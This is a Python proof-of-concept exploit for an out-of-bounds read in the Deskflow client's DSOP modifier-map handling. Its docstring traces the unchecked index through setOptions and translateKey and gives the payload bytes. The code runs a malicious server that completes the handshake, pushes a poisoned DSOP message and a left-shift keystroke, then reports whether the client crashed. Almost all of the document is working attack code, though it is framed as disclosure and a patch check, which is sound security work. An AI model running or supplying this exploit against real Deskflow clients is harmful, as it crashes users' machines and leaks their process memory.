#!/usr/bin/env python3
"""
CVE-XXXX-XXXXX -- Deskflow client DSOP modifier-map out-of-bounds read.

A malicious or on-path server can crash a connected Deskflow client (and read
out of bounds in the client's static .rodata) by sending a DSOP (set-options)
message that maps a modifier key to an out-of-range translation-table index,
then sending any modifier keystroke.

src/lib/client/ServerProxy.cpp::setOptions stores the wire-supplied option
value into m_modifierTranslationTable[id] with no bound against
kKeyModifierIDLast (7). On the next modifier key event
ServerProxy::translateKey does

    s_translationTable[m_modifierTranslationTable[id2]][side]

and ServerProxy::translateModifierMask does

    s_masks[m_modifierTranslationTable[...]]

indexing 7-element static arrays with the attacker's 32-bit value. A value such
as 0xFBFFFF04 lands about 34 GiB past the array base, unmapped in every
practical process layout, so a plain release client dies with SIGSEGV
(availability). A smaller value that stays inside mapped memory leaks 4 bytes of
adjacent .rodata into the translated KeyID (confidentiality).

The sibling odd-length heap over-read on the same DSOP path is already fixed on
master (setOptions rejects odd-length option vectors), so this PoC drives the
still-live modifier-map index bug with a well-formed even-length vector.

This PoC is the malicious server: it listens, speaks the plaintext v1.8
handshake ("Synergy" hello, then reads the client's helloback), answers the
client's info query, then pushes the poisoned DSOP followed by a left-shift
DKDN:

    44 53 4f 50 00 00 00 02 4d 4d 46 53 fb ff ff 04   DSOP | len=2 | "MMFS" | 0xFBFFFF04
    44 4b 44 4e ef e1 00 00 00 00                     DKDN | id=0xEFE1 (Shift_L) | mask | button

Detection: the vulnerable client dies on the shift keystroke and drops the
connection (VULNERABLE). A patched client that clamps the index keeps
translating shift normally and stays connected (PASS). Prereq: point a Deskflow
client at this host with TLS disabled, since the handshake here is plaintext.
"""

import argparse
import socket
import struct
import sys
import time

PROTO_MAJOR, PROTO_MINOR = 1, 8

OPTION_MODIFIER_MAP_FOR_SHIFT = int.from_bytes(b"MMFS", "big")
KEY_SHIFT_L = 0xEFE1
DEFAULT_INDEX = 0xFBFFFF04


def frame(payload):
    return struct.pack(">I", len(payload)) + payload


def recv_exact(sock, n):
    buf = bytearray()
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("peer closed during read")
        buf.extend(chunk)
    return bytes(buf)


def recv_packet(sock):
    size = struct.unpack(">I", recv_exact(sock, 4))[0]
    return recv_exact(sock, size) if size else b""


def handshake(conn):
    # Server speaks first. The client accepts either "Synergy" or "Barrier" as
    # the 7-char protocol name and echoes it back; it does not reject on version
    # at hello time, so v1.8 is fine.
    conn.sendall(frame(b"Synergy" + struct.pack(">hh", PROTO_MAJOR, PROTO_MINOR)))

    helloback = recv_packet(conn)
    if len(helloback) < 7 or helloback[:7] not in (b"Synergy", b"Barrier"):
        raise RuntimeError(f"unexpected helloback: {helloback!r}")

    # Query the client's screen info and consume the DINF reply. The roundtrip
    # forces the client's event loop to cycle so our later messages land as
    # fresh stream segments rather than one coalesced blob.
    conn.sendall(frame(b"QINF"))
    try:
        conn.settimeout(3.0)
        recv_packet(conn)
    except (socket.timeout, ConnectionError):
        pass


def poison_dsop(index):
    vector = struct.pack(">I", 2) + struct.pack(">II", OPTION_MODIFIER_MAP_FOR_SHIFT, index & 0xFFFFFFFF)
    return frame(b"DSOP" + vector)


def shift_keydown():
    return frame(b"DKDN" + struct.pack(">HHH", KEY_SHIFT_L, 0, 0))


def client_survived(conn):
    # A crashed client drops the socket: recv yields EOF or the peer resets.
    # A live client stays connected (it may sit idle or echo keep-alives), so
    # confirm with a second probe write, which is where a reset usually lands.
    time.sleep(2.0)
    conn.settimeout(0.5)
    try:
        if conn.recv(1) == b"":
            return False
    except socket.timeout:
        pass
    except OSError:
        return False
    conn.settimeout(5.0)
    try:
        conn.sendall(frame(b"CNOP"))
        time.sleep(0.5)
        conn.sendall(frame(b"CNOP"))
    except OSError:
        return False
    return True


def main():
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter
    )
    ap.add_argument("--host", default="127.0.0.1", help="address to bind the malicious server on")
    ap.add_argument("--port", type=int, default=24800)
    ap.add_argument(
        "--index", type=lambda x: int(x, 0), default=DEFAULT_INDEX,
        help="out-of-range translation-table index to poison (default 0xFBFFFF04)",
    )
    ap.add_argument("--timeout", type=float, default=60.0, help="seconds to wait for a client to connect")
    args = ap.parse_args()

    print("CVE-XXXX-XXXXX -- dsop modifier-map out-of-bounds read")
    print(f"malicious server on {args.host}:{args.port}, poison index 0x{args.index & 0xFFFFFFFF:08x}")
    print("start a deskflow client (tls disabled) pointed at this address")

    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((args.host, args.port))
    listener.listen(1)
    listener.settimeout(args.timeout)

    print("[*] waiting for client")
    try:
        conn, peer = listener.accept()
    except socket.timeout:
        print("[ERROR] no client connected within the timeout")
        return 2
    finally:
        listener.close()

    try:
        conn.settimeout(10.0)
        handshake(conn)
        print(f"client connected from {peer[0]}:{peer[1]}, handshake complete")
        conn.sendall(poison_dsop(args.index))
        print("sent poisoned dsop, mapped shift modifier to out-of-range index")
        time.sleep(0.3)
        conn.sendall(shift_keydown())
        print("sent left-shift key down to trigger the translation")
        alive = client_survived(conn)
    finally:
        conn.close()

    if alive:
        print("[PASS] client survived -- index clamped, fix in place")
        return 0
    print("[FAIL] client dropped connection -- VULNERABLE (CVE-XXXX-XXXXX)")
    return 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
